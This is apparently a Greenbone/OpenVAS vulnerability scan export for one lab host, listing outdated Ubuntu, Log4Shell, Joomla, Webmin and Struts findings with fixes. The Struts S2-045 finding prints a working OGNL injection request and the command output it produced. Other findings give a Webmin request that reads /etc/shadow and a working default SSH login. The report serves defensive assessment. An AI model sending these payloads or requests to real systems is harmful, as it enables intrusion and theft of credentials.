IP,Hostname,Port,Port Protocol,CVSS,Severity,QoD,Solution Type,NVT Name,Summary,Specific Result,NVT OID,CVEs,Task ID,Task Name,Timestamp,Result ID,Impact,Solution,Affected Software/OS,Vulnerability Insight,Vulnerability Detection Method,Product Detection Result,BIDs,CERTs,Other References
      192.168.155.132,,,,10.0,High,80,"Mitigation","Operating System (OS) End of Life (EOL) Detection","The Operating System (OS) on the remote host has reached the end
  of life (EOL) and should not be used anymore.","The ""Ubuntu"" Operating System on the remote host has reached the end of life.

CPE:               cpe:/o:canonical:ubuntu_linux:14.04
Installed version,
build or SP:       14.04
EOL date:          2024-04-01
EOL info:          https://wiki.ubuntu.com/Releases
",1.3.6.1.4.1.25623.1.0.103674,"",f033a5fd-0b5f-4ecd-a7b1-bc769ecb6a64,"ForAttacksScan",2024-11-30T03:23:21Z,b1dbb580-7bc1-432b-9ca8-f958ddd8995c,"An EOL version of an OS is not receiving any security updates
  from the vendor. Unfixed security vulnerabilities might be leveraged by an attacker to compromise
  the security of this host.","Upgrade the OS on the remote host to a version which is still
  supported and receiving security updates by the vendor.","","","Checks if an EOL version of an OS is present on the target
  host.
Details:
Operating System (OS) End of Life (EOL) Detection
(OID: 1.3.6.1.4.1.25623.1.0.103674)
Version used: 2024-02-28T14:37:42Z
","Product: cpe:/o:canonical:ubuntu_linux:14.04
Method: OS Detection Consolidation and Reporting
(OID: 1.3.6.1.4.1.25623.1.0.105937)
","","",""
192.168.155.132,,8080,tcp,10.0,High,100,"Workaround","Apache Struts 2.5.x Multiple Log4j Vulnerabilities (Log4Shell) - Active Check","Apache Struts is prone to multiple vulnerabilities in the Apache
  Log4j library.","It was possible to trigger the vulnerability and make the remote host sending a request back to the scanner host (Details on the received packet follows).

Destination IP:   192.168.155.133 (receiving IP on scanner host side)
Destination port: 12568/tcp (receiving port on scanner host side)
Originating IP:   192.168.155.132 (originating IP from target host side)
",1.3.6.1.4.1.25623.1.0.117950,"CVE-2021-44228,CVE-2021-45046",f033a5fd-0b5f-4ecd-a7b1-bc769ecb6a64,"ForAttacksScan",2024-11-30T03:23:21Z,cbf47faa-921c-435d-bc23-923064049e29,"","See the referenced vendor advisory for a workaround and/or
  update suggestions.","Apache Struts version 2.5.x is known to be affected.

  Notes:

  - This VT is also reporting a flaw for other products affected by the same payload like Apache Struts

  - Some products might use Apache Struts internally and thus could be affected as well","The following vulnerabilities exist:

  CVE-2021-44228: Apache Log4j2 JNDI features used in configuration, log messages, and parameters do
  not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can
  control log messages or log message parameters can execute arbitrary code loaded from LDAP servers
  when message lookup substitution is enabled. This vulnerability is dubbed 'Log4Shell'.

  CVE-2021-45046: Denial of Service (DoS) and a possible remote code execution (RCE) in certain
  non-default configurations.","Sends various crafted HTTP GET requests and checks the
  responses.

  Notes:

  - For a successful detection of this flaw the target host needs to be able to reach the scanner
  host on a TCP port randomly generated during the runtime of the VT (currently in the range of
  10000-32000).

  - This VT is using a default list of static files known for Apache Struts and is also making use
  of a possible previous Apache Struts detection to extend this list. To broaden the coverage of
  checked static files it is possible to set the 'Enable generic web application scanning' setting
  within the VT 'Global variable settings' (OID: 1.3.6.1.4.1.25623.1.0.12288) to 'yes'.
Details:
Apache Struts 2.5.x Multiple Log4j Vulnerabilities (Log4Shell) - Active Check
(OID: 1.3.6.1.4.1.25623.1.0.117950)
Version used: 2023-02-16T10:19:47Z
","","","DFN-CERT-2022-1813,DFN-CERT-2022-0805,DFN-CERT-2022-0591,DFN-CERT-2022-0153,DFN-CERT-2022-0146,DFN-CERT-2022-0096,DFN-CERT-2022-0081,DFN-CERT-2022-0074,DFN-CERT-2022-0068,DFN-CERT-2022-0008,DFN-CERT-2021-2666,DFN-CERT-2021-2634,DFN-CERT-2021-2633,DFN-CERT-2021-2624,DFN-CERT-2021-2623,DFN-CERT-2021-2620,DFN-CERT-2021-2619,DFN-CERT-2021-2616,DFN-CERT-2021-2598,DFN-CERT-2021-2588,DFN-CERT-2021-2585,DFN-CERT-2021-2582,DFN-CERT-2021-2581,DFN-CERT-2021-2576,WID-SEC-2024-0064,WID-SEC-2023-0063,WID-SEC-2022-1175,WID-SEC-2022-1015,WID-SEC-2022-0352,WID-SEC-2022-0351,CB-K22/0285,CB-K22/0148,CB-K22/0029,CB-K21/1283,CB-K21/1264",""
192.168.155.132,,80,tcp,9.8,High,80,"VendorFix","Joomla! Core LDAP Information Disclosure Vulnerability (Nov 2017)","Joomla is prone to an information disclosure vulnerability.","Installed version: 1.5.0
Fixed version:     3.8.2

",1.3.6.1.4.1.25623.1.0.811896,"CVE-2017-14596",f033a5fd-0b5f-4ecd-a7b1-bc769ecb6a64,"ForAttacksScan",2024-11-30T03:23:21Z,1620630f-766b-4352-8341-0034d79a2aa6,"Successfully exploiting this issue allow
  remote attackers to disclose username and password.","Upgrade to Joomla version 3.8.2 or later.","Joomla core version 1.5.0 through 3.8.1","The flaw exists due to an inadequate
  escaping in the LDAP authentication plugin.","Checks if a vulnerable version is present on the target host.
Details:
Joomla! Core LDAP Information Disclosure Vulnerability (Nov 2017)
(OID: 1.3.6.1.4.1.25623.1.0.811896)
Version used: 2024-02-20T05:05:48Z
","","","DFN-CERT-2017-1977,DFN-CERT-2017-1663,CB-K17/1899,CB-K17/1591",""
192.168.155.132,,80,tcp,9.8,High,80,"VendorFix","Joomla < 3.9.5 Multiple Vulnerabilities","Joomla! is prone to multiple vulnerabilities.","Installed version: 1.5.0
Fixed version:     3.9.5
Installation
path / port:       /joomla1.5.0

",1.3.6.1.4.1.25623.1.0.113369,"CVE-2019-10945,CVE-2019-10946,CVE-2019-11358",f033a5fd-0b5f-4ecd-a7b1-bc769ecb6a64,"ForAttacksScan",2024-11-30T03:23:21Z,1dbd475a-e405-4bc7-9d4b-ee672218bbe8,"Successful exploitation would allow an attacker to access sensitive information
  or execute arbitrary commands.","Update to version 3.9.5.","Joomla! through version 3.9.4.","The following vulnerabilities exist:

  - The Media Manager component does not properly sanitize the folder parameter,
    allowing attackers to act outside the media manager root directory

  - The 'refresh list of helpsites' endpoint of com_users lacks access checks,
    allowing calls from unauthenticated users

  - The $.extend method of JQuery is vulnerable to Object.prototype pollution attacks (CVE-2019-11358)","Checks if a vulnerable version is present on the target host.
Details:
Joomla < 3.9.5 Multiple Vulnerabilities
(OID: 1.3.6.1.4.1.25623.1.0.113369)
Version used: 2021-09-02T13:01:30Z
","","","DFN-CERT-2023-2027,DFN-CERT-2023-1197,DFN-CERT-2023-0481,DFN-CERT-2023-0245,DFN-CERT-2022-2467,DFN-CERT-2021-1536,DFN-CERT-2021-1503,DFN-CERT-2021-0826,DFN-CERT-2020-2423,DFN-CERT-2020-2335,DFN-CERT-2020-2286,DFN-CERT-2020-2130,DFN-CERT-2020-1812,DFN-CERT-2020-1574,DFN-CERT-2020-1537,DFN-CERT-2020-1506,DFN-CERT-2020-0772,DFN-CERT-2020-0769,DFN-CERT-2020-0721,DFN-CERT-2020-0276,DFN-CERT-2020-0102,DFN-CERT-2020-0100,DFN-CERT-2019-2169,DFN-CERT-2019-2158,DFN-CERT-2019-2156,DFN-CERT-2019-2126,DFN-CERT-2019-1861,DFN-CERT-2019-1663,DFN-CERT-2019-1460,DFN-CERT-2019-1182,DFN-CERT-2019-1153,DFN-CERT-2019-1118,DFN-CERT-2019-1033,DFN-CERT-2019-0914,DFN-CERT-2019-0899,DFN-CERT-2019-0805,DFN-CERT-2019-0723,WID-SEC-2023-1737,WID-SEC-2023-0239,WID-SEC-2022-1948,WID-SEC-2022-1947,WID-SEC-2022-0732,WID-SEC-2022-0673,CB-K22/0045,CB-K21/1083,CB-K20/1049,CB-K20/1030,CB-K20/0800,CB-K20/0710,CB-K20/0324,CB-K20/0314,CB-K20/0309,CB-K20/0106,CB-K20/0041,CB-K20/0037,CB-K20/0034,CB-K19/0921,CB-K19/0920,CB-K19/0916,CB-K19/0911,CB-K19/0909,CB-K19/0619,CB-K19/0504,CB-K19/0329,CB-K19/0287",""
192.168.155.132,,80,tcp,9.8,High,80,"VendorFix","Joomla < 3.8.12 Multiple Vulnerabilities","Joomla is prone to multiple vulnerabilities.","Installed version: 1.5.0
Fixed version:     3.8.12
Installation
path / port:       /joomla1.5.0

",1.3.6.1.4.1.25623.1.0.112371,"CVE-2018-15880,CVE-2018-15882",f033a5fd-0b5f-4ecd-a7b1-bc769ecb6a64,"ForAttacksScan",2024-11-30T03:23:21Z,7c043978-9a57-4d50-ad0a-8cfec00b235a,"","Update to version 3.8.12 or later.","Joomla CMS versions 1.5.0 through 3.8.11.","The following vulnerabilities exist:

  - Inadequate output filtering on the user profile page could lead to a stored XSS attack. (CVE-2018-15880)

  - Inadequate checks in the InputFilter class could allow specifically prepared PHAR files to pass the upload filter. (CVE-2018-15882)","Checks if a vulnerable version is present on the target host.
Details:
Joomla < 3.8.12 Multiple Vulnerabilities
(OID: 1.3.6.1.4.1.25623.1.0.112371)
Version used: 2021-09-29T12:07:39Z
","","","DFN-CERT-2018-1744",""
192.168.155.132,,80,tcp,9.8,High,80,"VendorFix","Joomla! < 3.9.7 Multiple Vulnerabilities","Joomla! is prone to multiple vulnerabilities.","Installed version: 1.5.0
Fixed version:     3.9.7
Installation
path / port:       /joomla1.5.0

",1.3.6.1.4.1.25623.1.0.113390,"CVE-2019-12764,CVE-2019-12765,CVE-2019-12766",f033a5fd-0b5f-4ecd-a7b1-bc769ecb6a64,"ForAttacksScan",2024-11-30T03:23:21Z,57ab12b6-b625-42d2-9ad1-e5458adab6c8,"Successful exploitation can have effects ranging from disclosure of sensitive information
  to executing arbitrary code on the target machine.","Update to version 3.9.7.","Joomla! through version 3.9.6.","The following vulnerabilities exist:

  - The update server URL of com_joomlaupdate can be manipulated by non Super-Admin users.

  - The subform fieldtype does not sufficiently filter or validate input of subfields.
    This leads to XSS attack vectors.

  - The CSV export of com_actionslogs is vulnerable to CSV injection.","Checks if a vulnerable version is present on the target host.
Details:
Joomla! < 3.9.7 Multiple Vulnerabilities
(OID: 1.3.6.1.4.1.25623.1.0.113390)
Version used: 2023-01-31T10:08:41Z
","","","DFN-CERT-2019-1179,CB-K19/0495",""
192.168.155.132,,8080,tcp,9.8,High,99,"VendorFix","Apache Struts Security Update (S2-045) - Active Check","Apache Struts is prone to a remote code execution (RCE)
  vulnerability.","It was possible to execute the command `id` on the remote host.

Request:

POST /struts2-showcase/showcase.action HTTP/1.1
Host: 192.168.155.132:8080
Pragma: no-cache
User-Agent: Mozilla/5.0 [en] (X11, U; Greenbone OS 22.04.22)
Accept-Language: en
Accept-Charset: iso-8859-1,utf-8;q=0.9,*;q=0.1
Accept: */*
Accept-Encoding: identity
Content-Length: 132
Content-Type:: %{(#GBVT='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#p=new java.lang.ProcessBuilder({'id'})).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}

--GBVT4502150
Content-Disposition: form-data; name=""GBVT""; filename=""GBVT.txt""
Content-Type: text/plain

GBVT

--GBVT4502150--

Response:

HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Transfer-Encoding: chunked
Date: Sat, 30 Nov 2024 04:12:47 GMT


uid=116(tomcat7) gid=125(tomcat7) groups=125(tomcat7)

",1.3.6.1.4.1.25623.1.0.140180,"CVE-2017-5638",f033a5fd-0b5f-4ecd-a7b1-bc769ecb6a64,"ForAttacksScan",2024-11-30T03:23:21Z,d3ad0ae4-1331-47b6-9c4b-9af1175d46c6,"Successfully exploiting this issue may allow an attacker to
  execute arbitrary code in the context of the affected application.","Updates are available. Please see the referenced vendor
  advisory for more information.","Apache Struts 2.3.5 through 2.3.31 and 2.5 through 2.5.10.","","Sends a crafted HTTP POST request and checks the response.
Details:
Apache Struts Security Update (S2-045) - Active Check
(OID: 1.3.6.1.4.1.25623.1.0.140180)
Version used: 2024-07-26T05:05:35Z
","","","DFN-CERT-2017-1236,DFN-CERT-2017-0677,DFN-CERT-2017-0675,DFN-CERT-2017-0407,WID-SEC-2024-1277,WID-SEC-2023-0461,CB-K17/1198,CB-K17/0661,CB-K17/0657,CB-K17/0402",""
192.168.155.132,,10000,tcp,9.8,High,80,"Mitigation","Webmin 1.880 Information Disclosure Vulnerability","Webmin is prone to an information disclosure vulnerability that allows non-privileged users to access arbitrary files.","Installed version: 1.580
Fixed version:     Please see the solution tag for an available Mitigation

",1.3.6.1.4.1.25623.1.0.113135,"CVE-2018-8712",f033a5fd-0b5f-4ecd-a7b1-bc769ecb6a64,"ForAttacksScan",2024-11-30T03:23:21Z,d060438b-c695-412f-8058-d745a82a973b,"Successful exploitation would allow an attacker to access any file on the system, ranging from sensitive documents to administrator passwords.","No patch is available as of 15th March, 2018. As a mitigation technique, the setting 'Can view any file as a log file' can be disabled,
  effectively stopping a user from exploiting this vulnerability.","Webmin through version 1.880","An issue was discovered in Webmin when the default Yes setting of 'Can view any file as a log file' is enabled.
  As a result of weak default configuration settings, limited users have full access rights to the underlying Unix system files, allowing the user to
  read sensitive data from the local system (using Local File Include) such as the '/etc/shadow' file via a 'GET /syslog/save_log.cgi?view=1&file=/etc/shadow' request.","The script checks if a vulnerable version is present on the target host.
Details:
Webmin 1.880 Information Disclosure Vulnerability
(OID: 1.3.6.1.4.1.25623.1.0.113135)
Version used: 2023-07-20T05:05:18Z
","","","",""
192.168.155.132,,22,tcp,9.8,High,95,"Mitigation","SSH Brute Force Logins With Default Credentials Reporting","It was possible to login into the remote SSH server using
  default credentials.","It was possible to login with the following credentials <User>:<Password>

admin:password

",1.3.6.1.4.1.25623.1.0.103239,"CVE-1999-0501,CVE-1999-0502,CVE-1999-0507,CVE-1999-0508,CVE-2020-9473,CVE-2023-1944,CVE-2024-22902,CVE-2024-31970",f033a5fd-0b5f-4ecd-a7b1-bc769ecb6a64,"ForAttacksScan",2024-11-30T03:23:21Z,11eebfc8-1c96-44a7-b07f-5a50bca6a07d,"This issue may be exploited by a remote attacker to e.g. gain
  access to sensitive information or modify system configuration.","Change the password as soon as possible.","The following products are known to use the default credentials
  checked by the VT 'SSH Brute Force Logins With Default Credentials' (OID:
  1.3.6.1.4.1.25623.1.0.108013) used for this reporting:

  - CVE-2020-9473: S. Siedle & Soehne SG 150-0 Smart Gateway before 1.2.4

  - CVE-2023-1944: minikube 1.29.0 and probably prior

  - CVE-2024-22902: Vinchin Backup & Recovery

  - CVE-2024-31970: AdTran SRG 834-5 HDC17600021F1 devices (with SmartOS 11.1.1.1) during a window
  of time when the device is being set up

  - Various additional products like e.g. Ubiquiti EdgeMax / EdgeRouter, Crestron AM-100 and similar
  for which no CVE was assigned (See 'default_credentials.inc' file on the file system for a full
  list)

  Other products might be affected as well.","As the VT 'SSH Brute Force Logins With Default Credentials'
  (OID: 1.3.6.1.4.1.25623.1.0.108013) might run into a timeout the actual reporting of this
  vulnerability takes place in this VT instead.","Reports default credentials detected by the VT
  'SSH Brute Force Logins With Default Credentials' (OID: 1.3.6.1.4.1.25623.1.0.108013).
Details:
SSH Brute Force Logins With Default Credentials Reporting
(OID: 1.3.6.1.4.1.25623.1.0.103239)
Version used: 2024-07-26T05:05:35Z
","","","",""
192.168.155.132,,10000,tcp,9.8,High,80,"VendorFix","Webmin < 1.997 XSS Vulnerability","Webmin is prone to a cross-site scripting (XSS) vulnerability.","Installed version: 1.580
Fixed version:     1.997
Installation
path / port:       /

",1.3.6.1.4.1.25623.1.0.124131,"CVE-2022-36446",f033a5fd-0b5f-4ecd-a7b1-bc769ecb6a64,"ForAttacksScan",2024-11-30T03:23:21Z,231ad17d-620e-491e-86e8-6d1e1d287824,"","Update to version 1.997 or later.","Webmin version prior to 1.997.","Software/apt-lib.pl in Webmin lacks HTML escaping for a UI command.","Checks if a vulnerable version is present on the target host.
Details:
Webmin < 1.997 XSS Vulnerability
(OID: 1.3.6.1.4.1.25623.1.0.124131)
Version used: 2023-10-19T05:05:21Z
","","","WID-SEC-2022-0825",""
